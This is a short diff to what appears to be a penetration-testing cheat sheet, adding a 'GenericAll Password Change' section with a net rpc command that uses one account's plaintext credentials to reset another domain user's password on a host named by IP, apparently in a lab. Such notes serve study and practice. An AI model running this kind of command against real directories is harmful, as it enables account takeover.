@@ -163,3 +163,8 @@ Trigger it (depends on DLL):
 systeminfo
 ```
 
+# GenericAll Password Change
+
+```sh
+net rpc password "iain.white" 'Password123!' -U "nagoya-industries.com"/"craig.carr"%"Spring2023" -S "192.168.122.21"
+```
